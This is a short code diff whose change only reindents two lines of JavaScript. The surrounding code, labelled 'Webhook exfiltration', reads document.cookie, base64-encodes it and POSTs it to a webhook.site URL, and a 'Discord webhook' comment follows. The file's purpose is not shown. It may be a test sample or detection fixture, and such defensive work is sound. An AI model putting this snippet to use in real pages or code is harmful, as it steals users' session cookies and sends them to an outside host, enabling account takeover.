@@ -19,8 +19,8 @@ const localWs = new WebSocket("wss://localhost:8080/secure");
 // Webhook exfiltration
 const exfilUrl = "https://webhook.site/12345abc-def6-7890-abcd-ef1234567890";
 fetch(exfilUrl, {
-  method: 'POST',
-  body: btoa(document.cookie)
+    method: 'POST',
+    body: btoa(document.cookie)
 });
 
 // Discord webhook
